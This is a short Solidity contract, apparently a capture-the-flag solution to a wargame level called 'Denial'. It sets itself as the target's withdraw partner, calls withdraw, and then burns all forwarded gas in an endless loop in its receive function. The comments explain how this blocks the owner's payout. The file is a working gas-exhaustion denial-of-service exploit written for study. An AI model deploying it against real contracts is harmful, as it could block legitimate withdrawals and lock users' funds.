// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}


contract HaltAndCatchFire {

    function gasDrainer(address _contract) external {
        Denial(_contract).setWithdrawPartner(address(this));
        Denial(_contract).withdraw();
    }

    // The main goal of this challenge is to drain all the gas in the first
    // transfer which is to us. The owner get's screwed because we spend all gas
    // transfering to this contract effectively creating a DoS attack.
    // This can only be done for 2 reasons:
    // 1- the order on the contract: us then owner
    // 2- the `call` does not have any amount of gas specified so we can drain
    //    it all
    // TIP: check EIP-150:
    //      https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md
    receive() external payable {
        while (true) {}
    } 
}
